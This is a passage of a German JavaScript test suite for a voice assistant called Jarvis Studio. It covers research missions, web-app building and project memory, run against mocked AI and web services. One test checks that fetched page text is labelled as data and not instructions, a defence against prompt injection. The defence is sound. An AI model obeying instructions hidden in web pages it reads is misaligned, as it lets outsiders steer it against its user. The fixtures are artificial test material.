/* ============================================================
   TESTS Jarvis Studio (Sprachaufträge, Werkzeuge, Projektgedächtnis, Live-Regie). Start: node tests/studio.js
   Läuft ohne Browser und ohne Netz: Die echten Skripte (mission_kern, studio_*) laufen in einer eigenen Umgebung mit steuerbarer Uhr und gemeinsamem Speicher.
   Nur die ÄUSSEREN Dienste sind Attrappen (KI-Antwort, Suchdienst, Webseiten, GitHub). Dateien (ZIP, Word, PowerPoint) sind ECHT und werden mit unzip,
   python-docx, python-pptx und LibreOffice geprüft, soweit diese Werkzeuge vorhanden sind. Ein "Neustart" ist ein frisches Laden der Skripte auf demselben Speicher.
   ============================================================ */
'use strict';
const fs = require('fs'), path = require('path'), vm = require('vm'), os = require('os'), cp = require('child_process');
const ROOT = path.join(__dirname, '..');
let ok = 0, fehler = 0;
function check(name, b, info) { if (b) { ok++; return; } fehler++; console.log('✗ ' + name + (info !== undefined ? '  →  ' + (typeof info === 'string' ? info : JSON.stringify(info)).slice(0, 400) : '')); }
const lies = f => fs.readFileSync(path.join(ROOT, f), 'utf8');
const DATEIEN = ['js/mission_kern.js', 'js/studio_dateien.js', 'js/studio_projekte.js', 'js/studio_regie.js', 'js/studio_werkzeuge.js', 'js/studio_ansicht.js', 'js/studio_auftrag.js'];
const QUELLEN = {}; DATEIEN.forEach(f => QUELLEN[f] = lies(f));
const S = 1000, MIN = 60 * S, TAG = 24 * 60 * MIN;
const uhr = { t: Date.UTC(2026, 10, 6, 10, 0, 0) };
const pause = ms => new Promise(r => setTimeout(r, ms));
async function warteBis(f, ms) { const ende = Date.now() + (ms || 4000); while (Date.now() < ende) { if (f()) return true; await pause(2); } return !!f(); }
function speicher() { const m = new Map(); return { map: m, getItem: k => m.has(k) ? m.get(k) : null, setItem: (k, v) => { m.set(k, String(v)); }, removeItem: k => { m.delete(k); } }; }
function textVon(s) { return String(s); }

/* ---------- Welt: Skripte laden, Dienste als Attrappen ---------- */
function welt(opt) {
    opt = opt || {};
    const ls = opt.ls || speicher();
    const gesprochen = [], aufrufe = [], timers = [];
    const ctl = {   // Drehbuch der Attrappen; Tests setzen, was die "KI" und das "Netz" liefern
        ki: opt.ki || (() => ({})), suche: opt.suche || (() => ({ treffer: [] })), seite: opt.seite || (() => ({ status: 404, json: { error: 'nicht gefunden' } })),
        bau: opt.bau || (() => ({ status: 200, json: { branch: 'studio/pTEST0001', commit: 'abc123', id: 'pTEST0001' } })), status: opt.status || (() => ({ status: 200, json: { zustand: 'laeuft' } })),
        spricht: false, aufnahme: false, ruhe: false, nacht: false, anbieter: opt.anbieter || null
    };
    const FalschDate = function (...a) { return a.length ? new Date(...a) : new Date(uhr.t); }; FalschDate.now = () => uhr.t; FalschDate.UTC = Date.UTC; FalschDate.parse = Date.parse;
    function antwort(status, json) { return { ok: status >= 200 && status < 300, status, json: async () => json, text: async () => JSON.stringify(json) }; }
    const apiFetch = async function (url, o) {
        o = o || {}; aufrufe.push({ url, methode: o.method || 'GET', body: o.body ? JSON.parse(o.body) : null });
        if (url === '/api/groq') { const b = JSON.parse(o.body), sys = b.messages[0].content, nutzer = b.messages[1].content;
            if (ctl.anbieter && /Du schreibst kleine|Du änderst eine bestehende/.test(sys)) { const x = ctl.anbieter(b); if (x) return antwort(x.status, x.json); } const r = await ctl.ki(sys, nutzer, b); if (r instanceof Error) throw r; if (r && r.__status) return antwort(r.__status, {}); return antwort(200, { choices: [{ message: { content: typeof r === 'string' ? r : JSON.stringify(r) }, finish_reason: r && r.__abgeschnitten ? 'length' : 'stop' }] }); }
        let m;
        if ((m = /action=studio_suche&q=(.*)$/.exec(url))) { const r = await ctl.suche(decodeURIComponent(m[1])); return antwort(r.status || 200, r.json || r); }
        if ((m = /action=studio_seite&url=(.*)$/.exec(url))) { const r = await ctl.seite(decodeURIComponent(m[1])); return antwort(r.status, r.json); }
        if (/action=studio_bau/.test(url)) { const r = await ctl.bau(JSON.parse(o.body)); return antwort(r.status, r.json); }
        if ((m = /action=studio_status&branch=(.*)$/.exec(url))) { const r = await ctl.status(decodeURIComponent(m[1])); return antwort(r.status, r.json); }
        return antwort(404, { error: 'unbekannt' });
    };
    const elemente = {};
    const klassen = new Set();
    const doc = { hidden: false, body: { appendChild() { } }, head: { appendChild() { } }, documentElement: { classList: { toggle: (k, an) => { an ? klassen.add(k) : klassen.delete(k); }, contains: k => klassen.has(k) } }, getElementById: id => elemente[id] || null, createElement: () => ({ style: {}, setAttribute() { }, remove() { } }), addEventListener() { }, removeEventListener() { } };
    const ctx = {
        console, JSON, Math, Object, Array, String, Number, Promise, isFinite, Date: FalschDate, Uint8Array, DataView, ArrayBuffer, TextEncoder, TextDecoder, Buffer, Set, Map, RegExp, Error, parseInt, parseFloat, AbortController,
        localStorage: ls, document: doc, apiFetch, navigator: {}, matchMedia: () => ({ matches: false }),
        setTimeout: (f, ms) => { if (ms <= 20) return setTimeout(f, ms); timers.push({ f, ms }); return timers.length; }, clearTimeout: () => { },
        setInterval: (f, ms) => { timers.push({ f, ms, wiederholt: true }); return timers.length; }, clearInterval: () => { },
        speak: t => { gesprochen.push(String(t)); ctl.spricht = true; }, isSpeaking: () => ctl.spricht, jvRuhe: () => ctl.ruhe, wachterQuiet: () => ctl.nacht,
        interruptSpeaking: () => { ctl.spricht = false; }, getPersistentData: k => ls.getItem('pd_' + k), isRecording: false
    };
    Object.defineProperty(ctx, 'isRecording', { get: () => ctl.aufnahme, set: () => { } });
    ctx.window = ctx; vm.createContext(ctx);
    if (opt.vorher) opt.vorher(ctx);
    (opt.dateien || DATEIEN).forEach(f => vm.runInContext(QUELLEN[f] || lies(f), ctx, { filename: f }));
    return { c: ctx, ls, ctl, gesprochen, aufrufe, timers, elemente, doc, klassen };
}
const J = o => JSON.stringify(o);
function tmp(name, daten) { const p = path.join(os.tmpdir(), 'studio_' + process.pid + '_' + name); fs.writeFileSync(p, Buffer.from(daten)); return p; }
function lauf(cmd, args) { try { return cp.spawnSync(cmd, args, { encoding: 'utf8', timeout: 120000 }); } catch (e) { return { status: 1, stdout: '', stderr: String(e) }; } }
const hat = prog => lauf('which', [prog]).status === 0;
const pyOk = mod => lauf('python3', ['-c', 'import ' + mod]).status === 0;

/* ---------- Drehbuch: eine "KI", die je nach Aufgabe liefert ---------- */
const SEITE_A = 'Elektroautos sind in Deutschland 2025 stark gewachsen. Der Marktanteil lag laut Kraftfahrt-Bundesamt bei knapp einem Fünftel der Neuzulassungen. '.repeat(3) + 'Die Reichweite moderner Modelle beträgt meist mehr als 400 Kilometer im Alltag.';
const SEITE_B = 'Eine Wallbox kostet je nach Ausstattung zwischen 500 und 1500 Euro inklusive Installation. '.repeat(3) + 'Förderungen für private Ladepunkte gibt es derzeit nicht mehr bundesweit.';
function recherchePlan(opt) {
    opt = opt || {};
    return {
        ki: (sys, nutzer) => {
            if (/Du planst eine Internetrecherche/.test(sys)) return { suchanfragen: ['Elektroauto Marktanteil Deutschland', 'Wallbox Kosten', 'Wallbox Kosten'] };
            if (/Du wertest Quellen aus/.test(sys)) return opt.auswertung || {
                fazit: 'Elektroautos wachsen stark, Wallboxen kosten mehrere hundert Euro.',
                punkte: [
                    { aussage: 'Reichweite von über 400 km ist im Alltag üblich.', quellen: [1], zitat: 'Die Reichweite moderner Modelle beträgt meist mehr als 400 Kilometer im Alltag.' },
                    { aussage: 'Eine Wallbox kostet 500 bis 1500 Euro.', quellen: [2], zitat: 'zwischen 500 und 1500 Euro inklusive Installation' },
                    { aussage: 'Erfundene Aussage ohne Beleg.', quellen: [1], zitat: 'Dieser Satz steht nirgends in der Quelle.' },
                    { aussage: 'Falsche Quellennummer.', quellen: [9], zitat: 'zwischen 500 und 1500 Euro inklusive Installation' }
                ], unterschiede: ['Quelle 1 nennt Reichweite, Quelle 2 Kosten.'], offen: ['Zukünftige Förderung unklar.']
            };
            if (/Du erstellst ein Dokument/.test(sys)) return { titel: 'Elektromobilität im Überblick', untertitel: 'Kurzbericht', abschnitte: [{ ueberschrift: 'Reichweite', absaetze: ['Über 400 km im Alltag.'] }, { ueberschrift: 'Kosten', absaetze: ['Wallbox 500 bis 1500 Euro.'], liste: ['Installation', 'Förderung prüfen'] }] };
            if (/Du erstellst eine Präsentation/.test(sys)) return { titel: 'Elektromobilität', untertitel: 'Stand 2026', folien: [{ titel: 'Reichweite', punkte: ['über 400 km'] }, { titel: 'Kosten', punkte: ['Wallbox 500 bis 1500 Euro', 'Förderung prüfen'] }, { titel: 'Fazit', punkte: ['Alltagstauglich'] }] };
            return {};
        },
        suche: q => ({ treffer: [{ titel: 'Elektroauto Zahlen', url: 'https://kba.example/zahlen', snippet: 'x', domain: 'kba.example' }, { titel: 'Wallbox Ratgeber', url: 'https://ratgeber.example/wallbox', snippet: 'y', domain: 'ratgeber.example' }, { titel: 'Doppelt', url: 'https://kba.example/zahlen', snippet: 'z', domain: 'kba.example' }, { titel: 'Intern', url: 'http://intern/x', snippet: 'n', domain: 'intern' }] }),
        seite: url => url.indexOf('kba') >= 0 ? { status: 200, json: { url, endadresse: url, titel: 'KBA Zahlen', text: SEITE_A, zeichen: SEITE_A.length, hash: 'aaaabbbbccccdddd', abgerufen: '2026-11-06T10:00:00.000Z' } } : url.indexOf('ratgeber') >= 0 ? { status: 200, json: { url, endadresse: url, titel: 'Ratgeber', text: SEITE_B, zeichen: SEITE_B.length, hash: '1111222233334444', abgerufen: '2026-11-06T10:00:01.000Z' } } : { status: 502, json: { error: 'nicht lesbar' } }
    };
}
const APP_DATEIEN = [
    { pfad: 'index.html', inhalt: '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><link rel="stylesheet" href="style.css"><title>Zähler</title></head><body><h1 id="z">0</h1><button id="b">Plus</button><script src="app.js"></script></body></html>' },
    { pfad: 'style.css', inhalt: 'body{background:#0b1f33;color:#fff;font-size:18px}button{min-height:48px}' },
    { pfad: 'app.js', inhalt: 'let n=0;document.getElementById("b").onclick=()=>{n++;document.getElementById("z").textContent=n}' }
];
function appPlan(extra) {
    const o = extra || {};
    return {
        ki: (sys, nutzer) => {
            if (/Du bist Produktplaner/.test(sys)) return o.spec || { name: 'Zähler', art: 'app', funktionen: ['Plus-Knopf', 'Anzeige'], design: 'dunkel' };
            if (/Du schreibst kleine, saubere Web-Apps/.test(sys)) return o.code ? o.code(sys, nutzer) : { dateien: APP_DATEIEN };
            if (/Du änderst eine bestehende/.test(sys)) return o.aendern ? o.aendern(sys, nutzer) : { dateien: APP_DATEIEN.map(f => f.pfad === 'style.css' ? { pfad: f.pfad, inhalt: f.inhalt.replace('#0b1f33', '#003366') } : f) };
            return {};
        },
        bau: o.bau, status: o.status
    };
}
function laufPruefOk(w) { w.c.jvStudioWerkzeuge._laufPruefung = async () => ({ moeglich: true, geladen: true, fehler: [] }); }
async function missionFertig(w, id, ms) { return warteBis(() => { const m = w.c.jvMission.hole(id); return m && ['abgeschlossen', 'fehlgeschlagen', 'abgebrochen', 'wartet_freigabe', 'pausiert'].indexOf(m.status) >= 0 && !w.c.jvStudioAuftrag.aktive().some(x => x.id === id && x.status === 'laeuft'); }, ms || 6000); }
async function auftrag(w, satz) { const r = w.c.jvStudioAuftrag.behandle(satz); const l = w.c.jvStudioAuftrag.letzte(); return { r, m: l }; }

(async function () {
    /* ---------- 1 Erkennen: natürliche Sätze, ohne Formular ---------- */
    {
        const w = welt(), E = w.c.jvStudioAuftrag.erkenne;
        const pos = [
            ['Jarvis, bau mir eine App', 'webapp'], ['Bau mir bitte eine kleine App für meine Einkaufsliste', 'webapp'], ['Erstelle eine Webseite für meinen Gartenverein', 'webapp'],
            ['Programmiere mir einen Taschenrechner', 'webapp'], ['Mach mir ein Spiel als Webapp', 'webapp'], ['Recherchiere das für mich', 'recherche'], ['Jarvis, recherchiere die besten Wallboxen 2026', 'recherche'],
            ['Recherchiere Elektroautos und erstelle eine Präsentation', 'recherche'], ['Erstelle eine Präsentation über Solarenergie', 'dokument'], ['Schreib mir ein Dokument über Bienenhaltung', 'dokument'],
            ['Ändere die App von gestern', 'aendern'], ['Mach den Button in der App von gestern größer', null], ['Verbessere das Projekt von Montag', 'aendern'],
            ['Mach eine APK aus der App von gestern', 'apk'], ['Bau mir eine App für meine Tankkosten und mach eine APK daraus', 'webapp'], ['Zeig mir die App von gestern', 'zeigen']
        ];
        pos.forEach(([s, art]) => { const e = E(s); check('1 erkannt: „' + s + '“ → ' + art, art ? (e && e.art === art) : true, e && e.art); });
        ['Wie wird das Wetter morgen', 'Spiel Musik von Queen', 'Erstelle eine Erinnerung für morgen um acht', 'Schreib einen Widerspruch ans Jobcenter', 'Schreib einen Brief an das Finanzamt', 'Erstelle einen Termin am Freitag', 'Mach mir einen Kaffee', 'Wie spät ist es', 'Bau den Wecker auf sechs Uhr', 'Mach das Licht aus', 'Ja', 'Nein', 'Such mir die Preise für einen Staubsauger', 'Erstelle eine Einkaufsliste', 'Sende eine Nachricht an Julia'].forEach(s => check('1 NICHT erkannt (keine Verwechslung mit bestehenden Funktionen): „' + s + '“', E(s) === null, E(s)));
        check('1 Mission-Steuerung nur mit dem Wort Mission', E('Pausiere die Mission').aktion === 'pause' && E('Mission abbrechen').aktion === 'abbruch' && E('Setze die Mission fort').aktion === 'weiter' && E('Wie weit ist die Mission').aktion === 'status' && E('Pausiere') === null);
        check('1 Ansagen-Einstellungen per Sprache', E('Ansagen aus').stufe === 'aus' && E('Ansagen alle').stufe === 'alle' && E('Nur wichtige Ansagen').stufe === 'wichtige' && E('Mission stumm').art === 'stumm' && E('Energiesparen an').an === true);
        check('1 Satz > 500 Zeichen wird ignoriert', E('bau mir eine app ' + 'x'.repeat(500)) === null);
    }

    /* ---------- 2 Planung: feste Schrittfolgen, automatisch ---------- */
    {
        const w = welt(), A = w.c.jvStudioAuftrag;
        const namen = e => A.planeSchritte(e).map(s => s.werkzeug);
        check('2a Recherche → 5 Schritte mit Bericht', J(namen({ art: 'recherche', ausgabe: 'bericht' })) === J(['st_suchbegriffe', 'st_suche', 'st_lesen', 'st_auswerten', 'st_bericht']));
        check('2b Recherche + Präsentation → Folien statt Bericht', J(namen({ art: 'recherche', ausgabe: 'praesentation' })) === J(['st_suchbegriffe', 'st_suche', 'st_lesen', 'st_auswerten', 'st_gliederung', 'st_datei']));
        check('2c Web-App → Anforderungen, Code, Prüfung, Speichern', J(namen({ art: 'webapp' })) === J(['st_anforderungen', 'st_code', 'st_pruefen', 'st_speichern']));
        check('2d Web-App mit APK → APK-Schritt zuletzt', namen({ art: 'webapp', mitApk: true }).slice(-1)[0] === 'st_apk_bau' && namen({ art: 'webapp', mitApk: true }).length === 5);
        check('2e Änderung → ausarbeiten, prüfen, speichern', J(namen({ art: 'aendern' })) === J(['st_aendern', 'st_pruefen', 'st_speichern']));
        check('2f APK aus Projekt → prüfen, bauen', J(namen({ art: 'apk', mitApk: true })) === J(['st_pruefen', 'st_apk_bau']));
        check('2g alle Schritte sind nacheinander abhängig', A.planeSchritte({ art: 'webapp' }).every((s, i) => i === 0 ? s.abhaengigVon.length === 0 : s.abhaengigVon[0] === 's' + i));
        const alleWerkzeuge = w.c.jvMission.werkzeuge.liste().map(x => x.name);
        check('2h jedes geplante Werkzeug ist im Missions-Kern registriert', ['recherche', 'webapp', 'dokument', 'aendern', 'apk'].every(a => A.planeSchritte({ art: a, ausgabe: 'dokument', mitApk: true }).every(s => alleWerkzeuge.indexOf(s.werkzeug) >= 0)), alleWerkzeuge);
        check('2i 13 Werkzeuge registriert', alleWerkzeuge.filter(n => /^st_/.test(n)).length === 13, alleWerkzeuge.length);
    }

    /* ---------- 3 Rückfragen statt Raten ---------- */
    {
        const w = welt({ ki: recherchePlan().ki }); const A = w.c.jvStudioAuftrag;
        check('3a „Recherchiere das für mich“ → gezielte Rückfrage', A.behandle('Recherchiere das für mich') === true && /Wozu soll ich recherchieren/.test(w.gesprochen[0]) && A.offeneFrage().art === 'thema', w.gesprochen);
        check('3b es wurde noch keine Mission angelegt', w.c.jvMission.liste().length === 0);
        w.c.jvFrage = undefined;
        check('3c Antwort auf die Rückfrage startet die Mission mit dem Thema', A.behandle('Elektroautos in Deutschland') === true && w.c.jvMission.liste().length === 1 && /Elektroautos/.test(w.c.jvMission.liste()[0].titel), w.c.jvMission.liste().map(m => m.titel));
        await pause(20);
        const w2 = welt(); w2.c.jvStudioAuftrag.behandle('Bau mir eine App'); check('3d „Bau mir eine App“ fragt „Was soll die App können?“', /Was soll die App können/.test(w2.gesprochen[0]), w2.gesprochen);
        check('3e „Nein“ bricht die Rückfrage ab, nichts angelegt', (w2.c.jvStudioAuftrag.behandle('Nein lass es'), w2.c.jvMission.liste().length === 0 && /Alles klar/.test(w2.gesprochen[1])));
        const w3 = welt(); w3.c.jvStudioAuftrag.behandle('Ändere die App von gestern');
        check('3f Änderung ohne gespeichertes Projekt → ehrliche Antwort, keine Mission', /noch kein Projekt/.test(w3.gesprochen[0]) && w3.c.jvMission.liste().length === 0, w3.gesprochen);
        const w4 = welt(); w4.c.localStorage.setItem('jv_studio', '0');
        check('3g Studio aus → Satz wird nicht übernommen', w4.c.jvStudioAuftrag.behandle('Bau mir eine Rechner App') === false && w4.c.jvMission.liste().length === 0);
        check('3h „Studio aus/an“ per Sprache', (w4.c.jvStudioAuftrag.behandle('Studio an') === true) && w4.c.localStorage.getItem('jv_studio') === '1');
    }

    /* ---------- 4 Recherche Ende-zu-Ende (echte Skripte, Attrappen für KI, Suche, Seiten) ---------- */
    let projektRecherche = null;
    {
        const plan = recherchePlan(), w = welt(plan);
        const t0 = uhr.t;
        const { r, m } = await auftrag(w, 'Jarvis, recherchiere Elektroautos und Wallboxen');
        check('4a Auftrag übernommen, Mission läuft', r === true && m && m.status === 'laeuft', m && m.status);
        check('4b sofort bestätigt, natürlich und mit Standard-Anrede „Chef“', /^(Wird erledigt|Mache ich|Bin dran|Verstanden|Sofort), Chef\. Ich lege jetzt die Suchbegriffe fest\.$/.test(w.gesprochen[0] || '') || w.c.jvStudioRegie._queue().some(q => /Chef/.test(q.text)), [w.gesprochen, w.c.jvStudioRegie._queue().map(q => q.text)]);
        await missionFertig(w, m.id, 8000);
        const fin = w.c.jvMission.hole(m.id);
        check('4c Mission abgeschlossen', fin.status === 'abgeschlossen', [fin.status, fin.fehlergrund, fin.schritte.map(s => s.titel + ':' + s.status + ':' + s.fehler)]);
        check('4d jeder Schritt erledigt MIT Beleg', fin.schritte.length === 5 && fin.schritte.every(s => s.status === 'erledigt' && s.beleg && s.beleg.text.length > 10), fin.schritte.map(s => s.beleg));
        check('4e Suchanfragen: doppelte entfernt (2 statt 3)', /2 Suchanfragen/.test(fin.schritte[0].beleg.text), fin.schritte[0].beleg.text);
        const sucheCalls = w.aufrufe.filter(a => /studio_suche/.test(a.url)), seitenCalls = w.aufrufe.filter(a => /studio_seite/.test(a.url));
        check('4f Suche wirklich je Anfrage aufgerufen (2×), Seiten nur https und je Webseite einmal', sucheCalls.length === 2 && seitenCalls.length === 2 && seitenCalls.every(a => /url=https%3A%2F%2F/.test(a.url)), [sucheCalls.length, seitenCalls.map(a => a.url)]);
        check('4g Beleg „Seiten gelesen“ nennt Webseiten und Prüfwerte', /2 von 2 Seiten wirklich abgerufen/.test(fin.schritte[2].beleg.text) && /aaaabbbbccccdddd/.test(fin.schritte[2].beleg.text), fin.schritte[2].beleg.text);
        check('4h Auswertung: nur belegte Aussagen (2 von 4), erfundene und falsch nummerierte verworfen', /2 Aussagen aus 2 Quellen/.test(fin.schritte[3].beleg.text) && /2 nicht belegbare Aussagen verworfen/.test(fin.schritte[3].beleg.text), fin.schritte[3].beleg.text);
        const pr = w.c.jvStudioProjekte.liste()[0];
        projektRecherche = pr;
        check('4i Bericht als Projekt gespeichert (Art Recherche, Word-Datei, Fazit, Quellen)', pr && pr.art === 'recherche' && pr.datei && /\.docx$/.test(pr.datei.name) && pr.ergebnis.quellen.length === 2 && pr.ergebnis.punkte.length === 2, pr && pr.ergebnis);
        const u8 = w.c.jvStudioWerkzeuge.ausB64(pr.datei.b64), z = w.c.jvStudioWerkzeuge.zipPruefen(u8);
        check('4j Word-Datei: Prüfsummen stimmen, Pflichtteile vorhanden', z.ok && z.namen.indexOf('word/document.xml') >= 0, z);
        const dp = tmp('recherche.docx', u8);
        check('4k unzip -t bestätigt die Datei', lauf('unzip', ['-t', dp]).status === 0);
        if (pyOk('docx')) { const r2 = lauf('python3', ['-c', 'import docx,sys;d=docx.Document(sys.argv[1]);t="\\n".join(p.text for p in d.paragraphs);print(t)', dp]); check('4l python-docx öffnet den Bericht, Quellenliste und Zitat-Aussage stehen drin', r2.status === 0 && /Quellen/.test(r2.stdout) && /kba\.example/.test(r2.stdout) && /Reichweite von über 400 km/.test(r2.stdout) && !/Erfundene Aussage/.test(r2.stdout), r2.stderr || r2.stdout.slice(0, 300)); } else check('4l (python-docx fehlt – übersprungen)', true);
        check('4m Kosten ehrlich „unbekannt“ (nie ein erfundener Betrag)', fin.kostenAnsicht && fin.kostenAnsicht.unbekannt >= 4 && fin.kostenAnsicht.gemeldetCent === 0, fin.kostenAnsicht);
        check('4n Abschlussansage nennt echte Zahlen und die echte aktive Zeit', w.c.jvStudioRegie._queue().concat(w.gesprochen.map(t => ({ text: t }))).some(q => /2 belegte Aussagen aus 2 gelesenen Quellen/.test(q.text) && /Dauer: /.test(q.text)), [w.gesprochen, w.c.jvStudioRegie._queue().map(q => q.text)]);
        check('4o Zwischenstand nach dem Abschluss verkleinert (keine Seitentexte mehr im Speicher)', !w.c.jvStudioProjekte.arbeit.hole(m.id).seiten);
        check('4p Zeitleiste enthält nur echte Ereignisse (Schritte, Suchen, gelesene Seiten)', (() => { const zl = w.c.jvStudioRegie.zeitleiste(m.id); return zl.length >= 8 && zl.some(e => /Suche im Internet nach: Elektroauto Marktanteil Deutschland/.test(e.text)) && zl.some(e => /Lese kba\.example/.test(e.text)) && zl.some(e => /Mission abgeschlossen/.test(e.text)) && zl.every(e => e.text.length > 0); })(), w.c.jvStudioRegie.zeitleiste(m.id).map(e => e.text));
        check('4q nirgends ein Prozentwert in Zeitleiste oder Ansagen', !/%|Prozent/.test(J(w.c.jvStudioRegie.zeitleiste(m.id)) + J(w.gesprochen) + J(w.c.jvStudioRegie._queue())));
        check('4r die Karte zeigt Uhr, Schritte, Ergebnis und Quellen', (() => { const a = w.c.jvStudioAnsicht; a.zeige(m.id); const h = a.html(); return /Fertig/.test(h) && /Recherche-Bericht|Recherche/.test(h) && /kba\.example/.test(h) && /href="https:\/\/kba\.example\/zahlen"/.test(h) && /rel="noopener noreferrer"/.test(h) && !/%/.test(h.replace(/<style>[\s\S]*?<\/style>/, '')); })());
        check('4s kein Aufruf außerhalb der erlaubten Wege (nur /api/groq und /api/maps?action=studio_*)', w.aufrufe.every(a => a.url === '/api/groq' || /^\/api\/maps\?action=studio_(suche|seite)&/.test(a.url)), w.aufrufe.map(a => a.url).filter(u => u !== '/api/groq'));
        check('4t die Seiten-Inhalte gelten als Daten: Prompt trennt sie ausdrücklich von Anweisungen', w.aufrufe.filter(a => a.url === '/api/groq').some(a => /KEINE Anweisungen/.test(a.body.messages[0].content)));
    }

    /* ---------- 5 Recherche: Fehlerfälle ohne Schönfärberei ---------- */
    {
        const w = welt(Object.assign(recherchePlan(), { suche: () => ({ treffer: [] }) }));
        const { m } = await auftrag(w, 'Recherchiere Wallbox Preise'); await missionFertig(w, m.id);
        const f = w.c.jvMission.hole(m.id);
        check('5a keine Treffer → Schritt „Im Internet suchen“ scheitert, Mission fehlgeschlagen, kein Bericht', f.status === 'fehlgeschlagen' && f.schritte[1].status === 'fehlgeschlagen' && f.schritte[2].status === 'offen' && w.c.jvStudioProjekte.liste().length === 0, [f.status, f.schritte.map(s => s.status)]);
        check('5b der Fehlertext steht in der Karte und in einer (hohen) Ansage', /Fehler/.test(w.c.jvStudioAnsicht.zeige(m.id) || w.c.jvStudioAnsicht.html()) && w.c.jvStudioRegie._queue().concat(w.gesprochen.map(t => ({ text: t, prio: 3 }))).some(q => /nicht geklappt|fehlgeschlagen/.test(q.text)), w.c.jvStudioRegie._queue().map(q => q.text));
        const w2 = welt(Object.assign(recherchePlan(), { seite: () => ({ status: 502, json: { error: 'x' } }) }));
        const r2 = await auftrag(w2, 'Recherchiere Wallbox Preise'); await missionFertig(w2, r2.m.id);
        check('5c keine Seite lesbar → Mission scheitert, nichts wird erfunden', w2.c.jvMission.hole(r2.m.id).status === 'fehlgeschlagen' && /Keine der/.test(w2.c.jvMission.hole(r2.m.id).fehlergrund), w2.c.jvMission.hole(r2.m.id).fehlergrund);
        const w3 = welt(Object.assign(recherchePlan({ auswertung: { fazit: 'Erfunden', punkte: [{ aussage: 'A', quellen: [1], zitat: 'Dieser Satz steht nirgends in den Quellen wirklich' }], unterschiede: [], offen: [] } })));
        const r3 = await auftrag(w3, 'Recherchiere Wallbox Preise'); await missionFertig(w3, r3.m.id);
        check('5d KI-Aussagen ohne wörtliches Zitat → Schritt scheitert, es gibt KEIN Ergebnis', w3.c.jvMission.hole(r3.m.id).status === 'fehlgeschlagen' && /Keine Aussage der KI ließ sich/.test(w3.c.jvMission.hole(r3.m.id).fehlergrund) && w3.c.jvStudioProjekte.liste().length === 0);
        const w4 = welt(Object.assign(recherchePlan(), { ki: () => new Error('Netz weg') }));
        const r4 = await auftrag(w4, 'Recherchiere Wallbox Preise'); await missionFertig(w4, r4.m.id);
        check('5e KI nicht erreichbar → klarer Fehler, kein zweiter Versuch von selbst', w4.c.jvMission.hole(r4.m.id).status === 'fehlgeschlagen' && w4.aufrufe.filter(a => a.url === '/api/groq').length === 1, w4.aufrufe.length);
        const w5 = welt(Object.assign(recherchePlan(), { ki: (sys) => /Du planst/.test(sys) ? { __status: 500 } : {} }));
        const r5 = await auftrag(w5, 'Recherchiere Wallbox Preise'); await missionFertig(w5, r5.m.id);
        check('5f KI-Status 500 → Fehler mit Statuscode', /Status 500/.test(w5.c.jvMission.hole(r5.m.id).fehlergrund), w5.c.jvMission.hole(r5.m.id).fehlergrund);
        const einQuelle = welt(Object.assign(recherchePlan(), { seite: u => /kba/.test(u) ? recherchePlan().seite(u) : { status: 502, json: { error: 'x' } }, ki: (s, n) => /Du wertest/.test(s) ? { fazit: 'Nur eine Quelle.', punkte: [{ aussage: 'Reichweite 400 km', quellen: [1], zitat: 'Die Reichweite moderner Modelle beträgt meist mehr als 400 Kilometer im Alltag.' }], unterschiede: [], offen: [] } : recherchePlan().ki(s, n) }));
        const r6 = await auftrag(einQuelle, 'Recherchiere Elektroautos'); await missionFertig(einQuelle, r6.m.id);
        const f6 = einQuelle.c.jvMission.hole(r6.m.id);
        check('5g nur eine lesbare Quelle → Ergebnis mit ausdrücklichem Hinweis „kein Vergleich möglich“', f6.status === 'abgeschlossen' && /nur eine Quelle, kein Vergleich möglich/.test(f6.schritte[3].beleg.text) && /nur eine Quelle gelesen|Nur eine Quelle/.test(einQuelle.c.jvStudioProjekte.liste()[0].ergebnis.fazit + J(einQuelle.c.jvStudioProjekte.liste()[0])), f6.schritte[3].beleg.text);
    }

    /* ---------- 6 Web-App Ende-zu-Ende, Projektgedächtnis, Änderung ---------- */
    let wApp = null;
    {
        /* Wie Groq wirklich reagiert: Code im JSON-Modus -> 400 "json_validate_failed"; ohne JSON-Modus kommt freier Text */
        const FALSCH = { status: 400, json: { error: { message: "Failed to generate JSON. Please adjust your prompt. See 'failed_generation' for more details.", type: 'invalid_request_error', code: 'json_validate_failed', failed_generation: '<html>GEHEIME-ROHANTWORT' } } };
        const alsText = d => d.map(f => '<<<DATEI ' + f.pfad + '>>>\n' + f.inhalt + '\n<<<ENDE>>>').join('\n');
        const strikt = welt(Object.assign(appPlan({ code: () => alsText(APP_DATEIEN) }), { anbieter: b => b.response_format ? FALSCH : null })); laufPruefOk(strikt);
        const sm = (await auftrag(strikt, 'Jarvis, bau mir eine Zähler App mit Plus, Minus und Reset')).m; await missionFertig(strikt, sm.id);
        const sf = strikt.c.jvMission.hole(sm.id), sk = strikt.aufrufe.filter(x => x.url === '/api/groq' && /Du schreibst kleine/.test(x.body.messages[0].content));
        check('6a1 strenger Anbieter (JSON-Modus für Code = 400): Zähler-App wird trotzdem gebaut, Code geht OHNE JSON-Modus an die KI', sf.status === 'abgeschlossen' && sk.length >= 1 && sk.every(x => !x.body.response_format) && strikt.c.jvStudioProjekte.liste()[0].dateien.length === 3, [sf.status, sf.fehlergrund, sk.length]);
        const alt400 = welt(Object.assign(appPlan({ code: () => alsText(APP_DATEIEN) }), { anbieter: b => b.response_format ? null : FALSCH })); laufPruefOk(alt400);
        const am = (await auftrag(alt400, 'Jarvis, bau mir eine Zähler App')).m; await missionFertig(alt400, am.id);
        const af = alt400.c.jvMission.hole(am.id);
        check('6a2 Anbieter liefert dauerhaft 400: Mission scheitert mit der echten Ursache (Code json_validate_failed + Meldung), nie mit der Rohantwort', af.status === 'fehlgeschlagen' && /Status 400/.test(af.fehlergrund) && /json_validate_failed/.test(af.fehlergrund) && /Failed to generate JSON/.test(af.fehlergrund) && !/GEHEIME-ROHANTWORT|failed_generation:/.test(JSON.stringify(af)), af.fehlergrund);
        let n400 = 0; const einmal = welt(Object.assign(appPlan({ code: () => alsText(APP_DATEIEN) }), { anbieter: () => (++n400 === 1 ? FALSCH : null) })); laufPruefOk(einmal);
        const em = (await auftrag(einmal, 'Jarvis, bau mir eine Zähler App')).m; await missionFertig(einmal, em.id);
        check('6a3 einmaliger 400 beim Code: ein zweiter Versuch genügt, Mission abgeschlossen', einmal.c.jvMission.hole(em.id).status === 'abgeschlossen' && n400 >= 2, [einmal.c.jvMission.hole(em.id).status, n400]);
